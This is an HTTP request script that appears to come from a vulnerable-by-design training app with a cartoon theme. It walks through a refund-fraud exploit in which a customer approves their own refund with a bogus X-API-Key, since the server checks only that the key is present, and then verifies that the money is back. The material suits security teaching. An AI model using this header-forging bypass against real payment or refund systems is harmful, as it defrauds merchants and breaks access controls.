# @import ../common/setup.http
@host = {{base_host}}/v203

# Sandy adds a new feature: now customers can check their refund status
# Restaurant managers can approve or reject refunds themselves
# (previously this was done by Sandy herself, manually)


# Plankton discovers a loophole: restaurant managers approve refunds via X-API-Key,
# but the server only checks IF a key is present, not whether it's valid!

{{
  await seedBalance("v203", "plankton@chum-bucket.sea", 100);
}}

### Fetch menu to pick an item
GET /menu

{{
  exports.kelp = response.parsedBody.find(i => i.name.includes("Kelp"));
}}

### Check starting balance
GET /account/credits
Authorization: {{plankton_auth}}

{{
  exports.balanceBefore = parseFloat(response.parsedBody.balance);
  console.info("ðŸ’° Balance before order: $" + exports.balanceBefore);
}}

### Create cart and add item
POST /cart
Authorization: {{plankton_auth}}

@cart_id = {{response.parsedBody.cart_id}}

###
POST /cart/{{cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{"item_id": "{{kelp.id}}"}

### Checkout
POST /cart/{{cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

tip=1&delivery_address=Chum Bucket

{{
  exports.order_total = parseFloat(response.parsedBody.total);
  exports.order_id = response.parsedBody.order_id;
}}

### Verify balance decreased
GET /account/credits
Authorization: {{plankton_auth}}

?? js parseFloat(response.parsedBody.balance) < {{balanceBefore}}

### Plankton requests a refund
POST /orders/{{order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount={{order_total}}

### --- EXPLOIT: Self-approve refund with fake API key ---
PATCH /orders/{{order_id}}/refund/status
Authorization: {{plankton_auth}}
X-API-Key: trust_me_bro
Content-Type: application/x-www-form-urlencoded

status=approved

?? status == 200
?? body status == approved

### Balance restored - free food!
GET /account/credits
Authorization: {{plankton_auth}}

?? js parseFloat(response.parsedBody.balance) == {{balanceBefore}}

{{
  console.info("ðŸ“ˆ Free " + kelp.name + " worth $" + order_total + "!");
}}
